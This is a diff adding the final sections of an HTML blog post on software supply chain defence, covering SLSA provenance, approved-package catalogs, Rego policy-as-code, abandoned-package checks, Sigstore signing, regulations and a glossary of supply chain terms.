+          the entire software supply chain — from source code to final artifact.
+        </p>
+
+        <pre><code class="lang-json">{
+  "_type": "https://in-toto.io/Statement/v1",
+  "subject": [{
+    "name": "myapp",
+    "digest": { "sha256": "abc123..." }
+  }],
+  "predicateType": "https://slsa.dev/provenance/v1",
+  "predicate": {
+    "buildDefinition": {
+      "buildType": "https://github.com/slsa-framework/slsa-github-generator",
+      "externalParameters": {
+        "repository": "https://github.com/myorg/myapp",
+        "ref": "refs/heads/main"
+      }
+    },
+    "runDetails": {
+      "builder": { "id": "https://github.com/slsa-framework/slsa-github-generator" },
+      "metadata": {
+        "invocationId": "https://github.com/myorg/myapp/actions/runs/12345"
+      }
+    }
+  }
+}</code></pre>
+
+        <!-- ============================================================ -->
+        <h2>8. Enterprise Dependency Governance.</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          Large organizations require systematic governance beyond technical controls. This section 
+          describes enterprise-grade dependency management programs.
+        </p>
+
+        <h3>8.1 Approved Dependency Catalogs</h3>
+        <p>
+          Maintain a curated list of pre-vetted packages. New dependencies require approval before use:
+        </p>
+        <ul>
+          <li><strong>Security review</strong>: Vulnerability history, maintainer reputation</li>
+          <li><strong>Legal review</strong>: License compatibility with product licensing</li>
+          <li><strong>Architectural review</strong>: Does it fit our tech stack? Alternatives?</li>
+          <li><strong>Support assessment</strong>: Maintenance activity, bus factor, funding</li>
+        </ul>
+
+        <pre><code class="lang-yaml"># approved-packages.yaml
+packages:
+  - name: lodash
+    ecosystem: npm
+    approved_versions: ">=4.17.21"
+    status: approved
+    review_date: 2024-01-15
+    reviewer: security-team
+    notes: "Pin to 4.17.21+ for prototype pollution fix"
+    
+  - name: log4j-core
+    ecosystem: maven
+    approved_versions: ">=2.17.1"
+    status: approved_with_conditions
+    conditions:
+      - "Must not use JndiLookup"
+      - "Remove lookup functionality via JVM flag"
+      
+  - name: leftpad
+    ecosystem: npm
+    status: banned
+    reason: "Single function, no maintenance, historical removal incident"</code></pre>
+
+        <h3>8.2 Dependency Review Workflows</h3>
+
+        <div class="diagram-container">
+          <svg viewBox="0 0 720 280" xmlns="http://www.w3.org/2000/svg">
+            <style>
+              .gov-box { fill: #f5f5f0; stroke: #888880; stroke-width: 1.5; }
+              .gov-decision { fill: #fffdf0; stroke: #b8860b; stroke-width: 1.5; }
+              .gov-label { fill: #1a1a1a; font-family: 'Kalam', cursive; font-size: 11px; }
+              .gov-detail { fill: #555555; font-family: 'Kalam', cursive; font-size: 9px; }
+              .gov-arrow { stroke: #666660; stroke-width: 1.5; fill: none; marker-end: url(#gov-arr); }
+            </style>
+            <defs>
+              <marker id="gov-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+                <polygon points="0 0, 8 3, 0 6" fill="#666660"/>
+              </marker>
+            </defs>
+            
+            <!-- Developer Request -->
+            <rect x="20" y="100" width="100" height="60" rx="4" class="gov-box"/>
+            <text x="70" y="125" text-anchor="middle" class="gov-label">Developer</text>
+            <text x="70" y="142" text-anchor="middle" class="gov-detail">Requests new</text>
+            <text x="70" y="154" text-anchor="middle" class="gov-detail">dependency</text>
+            
+            <!-- Auto-check -->
+            <rect x="160" y="100" width="100" height="60" rx="4" class="gov-box"/>
+            <text x="210" y="125" text-anchor="middle" class="gov-label">Auto-Check</text>
+            <text x="210" y="142" text-anchor="middle" class="gov-detail">Vuln scan</text>
+            <text x="210" y="154" text-anchor="middle" class="gov-detail">License check</text>
+            
+            <!-- Decision: Auto-approve? -->
+            <polygon points="340,130 380,100 420,130 380,160" class="gov-decision"/>
+            <text x="380" y="135" text-anchor="middle" class="gov-detail">In catalog?</text>
+            
+            <!-- Auto-approved -->
+            <rect x="480" y="30" width="100" height="50" rx="4" class="gov-box" style="fill: #f0fff0;"/>
+            <text x="530" y="52" text-anchor="middle" class="gov-label">Approved</text>
+            <text x="530" y="68" text-anchor="middle" class="gov-detail">Add to project</text>
+            
+            <!-- Manual Review -->
+            <rect x="480" y="110" width="100" height="60" rx="4" class="gov-box"/>
+            <text x="530" y="135" text-anchor="middle" class="gov-label">Manual Review</text>
+            <text x="530" y="152" text-anchor="middle" class="gov-detail">Security team</text>
+            
+            <!-- Decision: Approved? -->
+            <polygon points="530,200 570,230 530,260 490,230" class="gov-decision"/>
+            <text x="530" y="235" text-anchor="middle" class="gov-detail">Approve?</text>
+            
+            <!-- Added to catalog -->
+            <rect x="620" y="110" width="90" height="50" rx="4" class="gov-box" style="fill: #f0fff0;"/>
+            <text x="665" y="132" text-anchor="middle" class="gov-label">Catalog</text>
+            <text x="665" y="148" text-anchor="middle" class="gov-detail">Add + approve</text>
+            
+            <!-- Rejected -->
+            <rect x="620" y="205" width="90" height="50" rx="4" class="gov-box" style="fill: #fff5f5;"/>
+            <text x="665" y="227" text-anchor="middle" class="gov-label">Rejected</text>
+            <text x="665" y="243" text-anchor="middle" class="gov-detail">Find alternative</text>
+            
+            <!-- Arrows -->
+            <path d="M 120 130 L 155 130" class="gov-arrow"/>
+            <path d="M 260 130 L 335 130" class="gov-arrow"/>
+            <path d="M 380 100 L 380 55 L 475 55" class="gov-arrow"/>
+            <text x="400" y="50" class="gov-detail">yes</text>
+            <path d="M 420 130 L 475 130" class="gov-arrow"/>
+            <text x="445" y="125" class="gov-detail">no</text>
+            <path d="M 530 170 L 530 195" class="gov-arrow"/>
+            <path d="M 570 230 L 620 165" class="gov-arrow"/>
+            <text x="600" y="185" class="gov-detail">yes</text>
+            <path d="M 530 260 L 530 275 L 660 275 L 660 260" class="gov-arrow"/>
+            <text x="580" y="268" class="gov-detail">no</text>
+          </svg>
+          <p class="diagram-label">Fig. 6 — Enterprise dependency approval workflow with automated and manual gates.</p>
+        </div>
+
+        <h3>8.3 Risk Scoring</h3>
+        <p>
+          Quantify dependency risk to prioritize review and remediation:
+        </p>
+
+        <table>
+          <thead>
+            <tr><th>Factor</th><th>Weight</th><th>Scoring Criteria</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>CVE history</td><td>30%</td><td>Critical CVEs in past 2 years</td></tr>
+            <tr><td>Maintainer activity</td><td>20%</td><td>Commits in past 6 months</td></tr>
+            <tr><td>Bus factor</td><td>15%</td><td>Number of active maintainers</td></tr>
+            <tr><td>Dependency depth</td><td>15%</td><td>How deep in the tree</td></tr>
+            <tr><td>Usage criticality</td><td>10%</td><td>How many apps use it</td></tr>
+            <tr><td>Exposure surface</td><td>10%</td><td>Network, auth, crypto involvement</td></tr>
+          </tbody>
+        </table>
+        <p class="diagram-label">Tab. 8 — Dependency risk scoring model for enterprise prioritization.</p>
+
+        <h3>8.4 Policy-as-Code Enforcement</h3>
+
+        <pre><code class="lang-rego"># OPA/Rego policy for dependency governance
+package dependency.policy
+
+# Deny packages with critical vulnerabilities
+deny[msg] {
+  input.vulnerabilities[_].severity == "CRITICAL"
+  msg := sprintf("Critical vulnerability %s in %s", 
+    [input.vulnerabilities[_].id, input.package.name])
+}
+
+# Deny banned licenses
+banned_licenses := {"GPL-3.0", "AGPL-3.0", "SSPL-1.0"}
+deny[msg] {
+  license := input.package.license
+  banned_licenses[license]
+  msg := sprintf("Banned license %s in %s", [license, input.package.name])
+}
+
+# Deny packages not in approved catalog
+deny[msg] {
+  not data.approved_packages[input.package.name]
+  msg := sprintf("Package %s not in approved catalog", [input.package.name])
+}
+
+# Warn on unmaintained packages (no commits in 12 months)
+warn[msg] {
+  input.package.last_commit_days > 365
+  msg := sprintf("Package %s appears unmaintained (%d days since last commit)",
+    [input.package.name, input.package.last_commit_days])
+}</code></pre>
+
+        <h3>8.5 Abandoned Package Detection</h3>
+        <p>
+          Unmaintained packages become security liabilities. Automated detection criteria:
+        </p>
+        <ul>
+          <li>No commits in 12+ months</li>
+          <li>Unanswered issues/PRs piling up</li>
+          <li>Deprecated status in registry</li>
+          <li>Maintainer public statements about abandonment</li>
+          <li>Transfer of ownership to unknown parties</li>
+        </ul>
+
+        <pre><code class="lang-bash"># GitHub API to check maintenance status
+curl -s "https://api.github.com/repos/owner/repo/commits?per_page=1" | \
+  jq -r '.[0].commit.author.date' | \
+  xargs -I {} date -d {} +%s | \
+  awk -v now=$(date +%s) '{
+    days = (now - $1) / 86400;
+    if (days > 365) print "WARNING: No commits in", int(days), "days"
+  }'</code></pre>
+
+        <!-- ============================================================ -->
+        <h2>9. Future of Software Supply Chain Security.</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          The supply chain security landscape is evolving rapidly. This section examines emerging 
+          threats and defensive capabilities.
+        </p>
+
+        <h3>9.1 AI-Generated Malicious Packages</h3>
+        <p>
+          Large language models can generate convincing malicious packages at scale:
+        </p>
+        <ul>
+          <li><strong>Typosquat generation</strong>: AI identifies typo variants of popular packages</li>
+          <li><strong>Functional wrappers</strong>: Malware that actually provides advertised functionality</li>
+          <li><strong>Obfuscation at scale</strong>: Polymorphic payloads that evade signature detection</li>
+          <li><strong>Social engineering</strong>: AI-written READMEs, documentation, issue responses</li>
+        </ul>
+        <p>
+          Counter-measures require behavioral analysis, not just static signatures. Machine learning 
+          models that detect anomalous package behavior — unusual network calls, file system access 
+          patterns, environment variable reading — become essential.
+        </p>
+
+        <h3>9.2 Signed Package Ecosystems</h3>
+        <p>
+          Sigstore is driving ecosystem-wide adoption of cryptographic signing:
+        </p>
+        <ul>
+          <li><strong>npm</strong>: Exploring Sigstore integration for package provenance</li>
+          <li><strong>PyPI</strong>: PEP 740 proposes attestation support</li>
+          <li><strong>Maven</strong>: Sigstore Java client available</li>
+          <li><strong>Go</strong>: sum.golang.org provides transparency log</li>
+        </ul>
+        <p>
+          The end state: package managers that <strong>refuse to install unsigned packages</strong> 
+          by default, with keyless signing tied to developer identity via OIDC.
+        </p>
+
+        <h3>9.3 Zero-Trust Software Supply Chains</h3>
+        <p>
+          Zero-trust principles applied to software supply chains:
+        </p>
+        <ul>
+          <li><strong>Never trust, always verify</strong>: Every artifact verified before use</li>
+          <li><strong>Least privilege builds</strong>: Build environments with minimal capabilities</li>
+          <li><strong>Continuous verification</strong>: Re-verify artifacts in production, not just at build</li>
+          <li><strong>Immutable infrastructure</strong>: No runtime modification of deployed software</li>
+        </ul>
+
+        <h3>9.4 Regulatory Landscape</h3>
+        <p>
+          Governments worldwide are mandating supply chain security controls:
+        </p>
+
+        <table>
+          <thead>
+            <tr><th>Regulation</th><th>Jurisdiction</th><th>Key Requirements</th><th>Effective</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>EO 14028</td><td>US Federal</td><td>SBOM, secure development practices</td><td>2021</td></tr>
+            <tr><td>Cyber Resilience Act</td><td>EU</td><td>SBOM, vulnerability handling, CE marking</td><td>2027</td></tr>
+            <tr><td>NIS2 Directive</td><td>EU</td><td>Supply chain security for critical infrastructure</td><td>2024</td></tr>
+            <tr><td>CIRCIA</td><td>US</td><td>Incident reporting for critical infrastructure</td><td>2024</td></tr>
+          </tbody>
+        </table>
+        <p class="diagram-label">Tab. 9 — Major supply chain security regulations by jurisdiction.</p>
+
+        <h3>9.5 Trusted Build Graphs</h3>
+        <p>
+          Future build systems will maintain cryptographically verifiable graphs of all build inputs:
+        </p>
+        <ul>
+          <li>Source code commits (signed, linked to identity)</li>
+          <li>All dependencies (with verified provenance)</li>
+          <li>Build environment (attested configuration)</li>
+          <li>Build outputs (signed, reproducible)</li>
+        </ul>
+        <p>
+          Any modification to any input is detectable. The entire chain from developer keystroke 
+          to production deployment is cryptographically linked.
+        </p>
+
+        <div class="diagram-container">
+          <svg viewBox="0 0 720 220" xmlns="http://www.w3.org/2000/svg">
+            <style>
+              .future-box { fill: #f5f5f0; stroke: #888880; stroke-width: 1.5; }
+              .future-signed { fill: #f0fff0; stroke: #5a8a5a; stroke-width: 2; }
+              .future-label { fill: #1a1a1a; font-family: 'Kalam', cursive; font-size: 11px; }
+              .future-detail { fill: #555555; font-family: 'Kalam', cursive; font-size: 9px; }
+              .future-arrow { stroke: #5a8a5a; stroke-width: 2; fill: none; marker-end: url(#future-arr); }
+            </style>
+            <defs>
+              <marker id="future-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto">
+                <polygon points="0 0, 8 3, 0 6" fill="#5a8a5a"/>
+              </marker>
+            </defs>
+            
+            <!-- Developer -->
+            <rect x="20" y="80" width="90" height="60" rx="4" class="future-signed"/>
+            <text x="65" y="105" text-anchor="middle" class="future-label">Developer</text>
+            <text x="65" y="122" text-anchor="middle" class="future-detail">OIDC identity</text>
+            <text x="65" y="134" text-anchor="middle" class="future-detail">Signed commit</text>
+            
+            <!-- Source -->
+            <rect x="140" y="80" width="90" height="60" rx="4" class="future-signed"/>
+            <text x="185" y="105" text-anchor="middle" class="future-label">Source</text>
+            <text x="185" y="122" text-anchor="middle" class="future-detail">Git SHA + sig</text>
+            <text x="185" y="134" text-anchor="middle" class="future-detail">Transparency log</text>
+            
+            <!-- Deps -->
+            <rect x="260" y="80" width="90" height="60" rx="4" class="future-signed"/>
+            <text x="305" y="105" text-anchor="middle" class="future-label">Dependencies</text>
+            <text x="305" y="122" text-anchor="middle" class="future-detail">Signed packages</text>
+            <text x="305" y="134" text-anchor="middle" class="future-detail">SLSA provenance</text>
+            
+            <!-- Build -->
+            <rect x="380" y="80" width="90" height="60" rx="4" class="future-signed"/>
+            <text x="425" y="105" text-anchor="middle" class="future-label">Build</text>
+            <text x="425" y="122" text-anchor="middle" class="future-detail">Hermetic env</text>
+            <text x="425" y="134" text-anchor="middle" class="future-detail">Attested config</text>
+            
+            <!-- Artifact -->
+            <rect x="500" y="80" width="90" height="60" rx="4" class="future-signed"/>
+            <text x="545" y="105" text-anchor="middle" class="future-label">Artifact</text>
+            <text x="545" y="122" text-anchor="middle" class="future-detail">Signed + SBOM</text>
+            <text x="545" y="134" text-anchor="middle" class="future-detail">Reproducible</text>
+            
+            <!-- Deploy -->
+            <rect x="620" y="80" width="80" height="60" rx="4" class="future-signed"/>
+            <text x="660" y="105" text-anchor="middle" class="future-label">Deploy</text>
+            <text x="660" y="122" text-anchor="middle" class="future-detail">Policy verified</text>
+            <text x="660" y="134" text-anchor="middle" class="future-detail">Admission ctrl</text>
+            
+            <!-- Arrows -->
+            <path d="M 110 110 L 135 110" class="future-arrow"/>
+            <path d="M 230 110 L 255 110" class="future-arrow"/>
+            <path d="M 350 110 L 375 110" class="future-arrow"/>
+            <path d="M 470 110 L 495 110" class="future-arrow"/>
+            <path d="M 590 110 L 615 110" class="future-arrow"/>
+            
+            <!-- Trust chain label -->
+            <text x="360" y="180" text-anchor="middle" class="future-label">Cryptographically verified trust chain</text>
+            <text x="360" y="198" text-anchor="middle" class="future-detail">Every step signed, logged, and verifiable</text>
+          </svg>
+          <p class="diagram-label">Fig. 7 — Future state: end-to-end cryptographic verification of the entire software supply chain.</p>
+        </div>
+
+        <!-- ============================================================ -->
+        <h2>Conclusion: Defense in Depth.</h2>
+        <!-- ============================================================ -->
+
+        <p>
+          Software supply chain security is not a single control — it's a program. The organizations 
+          that survive supply chain attacks implement multiple overlapping defenses:
+        </p>
+
+        <ol>
+          <li><strong>Registry hygiene</strong>: Single-source resolution, no fallback to public</li>
+          <li><strong>Pinning and locking</strong>: Exact versions, integrity hashes, reproducible installs</li>
+          <li><strong>Build isolation</strong>: Network-disabled builds, ephemeral runners, minimal privileges</li>
+          <li><strong>SBOM generation</strong>: Continuous inventory, vulnerability tracking, drift detection</li>
+          <li><strong>Signing and attestation</strong>: Cosign, SLSA provenance, in-toto verification</li>
+          <li><strong>Governance</strong>: Approved catalogs, risk scoring, policy-as-code enforcement</li>
+          <li><strong>Monitoring</strong>: Behavioral analysis, anomaly detection, threat intelligence</li>
+        </ol>
+
+        <p>
+          The XZ Utils backdoor was caught by accident. The SolarWinds compromise ran for months. 
+          The event-stream attack targeted specific high-value victims while remaining dormant in 
+          most environments. Sophisticated supply chain attacks are designed to evade detection.
+        </p>
+        <p>
+          The only defense is making the attack surface as small and as monitored as possible — 
+          and having the forensic capability to detect and respond when something slips through.
+        </p>
+
+        <blockquote>
+          "In the supply chain security game, defense is exponentially harder than offense. 
+          Attackers need to find one weak link. Defenders need to secure every link, in every 
+          chain, in every build, forever."<br>
+          <span style="color: var(--faint)">— Dan Lorenc, Chainguard CEO</span>
+        </blockquote>
+
+        <p>
+          The good news: the tooling has matured dramatically. Sigstore makes signing accessible. 
+          SLSA provides a maturity framework. SBOMs are becoming standard. Policy engines can 
+          enforce controls automatically. The path to secure supply chains is clearer than ever.
+        </p>
+        <p>
+          The bad news: most organizations haven't started walking it. The gap between best 
+          practice and common practice is where the next major incident will emerge.
+        </p>
+        <p>
+          Close the gap.
+        </p>
+
+      </div>
+
+      <div class="post-nav">
+        <a href="ai-jobs-or-prosperity.html">← AI Jobs or Prosperity</a>
+        <span></span>
+      </div>
+    </article>
+
+    <footer class="footer">
+      <span>© cvam — written in plaintext, served warm</span>
+    </footer>
+  </div>
+
+  <!-- vocab panel -->
+  <aside class="vocab-panel" id="vocab-panel">
+    <p class="vocab-panel-label">// vocab</p>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">SBOM</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">Software Bill of Materials. A machine-readable inventory of all components in a software artifact — libraries, frameworks, dependencies with version and supplier information. Like a nutritional label for software.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">SLSA</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">Supply-chain Levels for Software Artifacts. A security framework with 4 levels defining increasingly rigorous supply chain integrity guarantees — from basic provenance (L1) to hermetic, two-person-reviewed builds (L4).</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">Transitive dependency</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">A dependency of a dependency. If your code uses A, and A uses B, then B is a transitive dependency. Most security vulnerabilities hide in transitive deps you didn't explicitly choose.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">Dependency confusion</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">Attack where an attacker publishes a malicious package to a public registry with the same name as an internal/private package. If the build system checks both registries, it may prefer the attacker's higher-versioned public package.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">Typosquatting</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">Registering package names similar to popular libraries (e.g., "lodahs" instead of "lodash") hoping developers mistype during installation.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">Hermetic build</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">A build with no network access — all dependencies must be pre-fetched and verified before the build starts. Prevents build-time supply chain attacks because malicious code can't phone home or fetch payloads.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">Sigstore</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">A Linux Foundation project providing free, keyless code signing. Uses OIDC for identity (your GitHub/Google account) and a transparency log (Rekor) so anyone can verify who signed what and when.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">Cosign</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">The Sigstore tool for signing and verifying container images and other artifacts. "cosign sign" creates a signature; "cosign verify" checks it. Supports keyless signing via OIDC.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">VEX</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">Vulnerability Exploitability eXchange. A document format that communicates whether a vulnerability affects a specific product. "Yes, we have log4j, but the vulnerable code path is never executed in our context."</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">in-toto</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">A framework for cryptographically verifying the integrity of the entire software supply chain. Defines "layouts" (what steps should happen) and "link metadata" (what actually happened) that can be independently verified.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">Reproducible build</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">A build that produces bit-for-bit identical output from identical input. Anyone can verify the artifact was built from the claimed source code by rebuilding it themselves.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">Protestware</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">When a package maintainer intentionally sabotages their own package for political or personal reasons. The colors/faker incident (infinite loops) and node-ipc (file deletion for Russian IPs) are notable examples.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">CycloneDX</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">An OWASP-maintained SBOM format with a security focus. Lightweight, supports VEX, and integrates well with vulnerability scanning tools. JSON and XML formats available.</div>
+    </div>
+
+    <div class="vocab-term">
+      <div class="vocab-term-header">
+        <span class="vocab-term-word">SPDX</span>
+        <span class="vocab-term-arrow">▶</span>
+      </div>
+      <div class="vocab-term-def">Software Package Data Exchange. A Linux Foundation SBOM standard that's now ISO/IEC 5962:2021. Strong focus on license compliance in addition to security.</div>
+    </div>
+
+  </aside>
+
+</div>
+
+<script src="../posts.js"></script>
+<script src="../app.js"></script>
+<script src="../highlighter.js"></script>
+</body>
+</html>
